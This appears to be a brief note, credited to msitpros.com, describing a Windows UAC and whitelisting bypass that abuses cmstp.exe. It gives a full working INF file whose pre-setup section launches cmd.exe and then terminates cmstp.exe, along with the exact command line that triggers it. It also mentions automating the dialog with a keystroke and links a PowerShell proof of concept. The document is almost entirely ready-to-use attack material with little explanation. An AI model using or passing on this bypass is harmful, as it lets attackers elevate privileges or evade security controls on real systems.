From:
https://msitpros.com/?p=3960

corpvpn.inf:

```
[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
 
[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
C:\Windows\System32\cmd.exe
taskkill /IM cmstp.exe /F
 
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
 
[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
 
[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
```

cmd:

`C:\Windows\System32\cmstp.exe corpvpn.inf /au`

Then pop up a dialog box,need to click OK.

But we can send a key to it.

POC:

https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-uacbypasscmstp-ps1

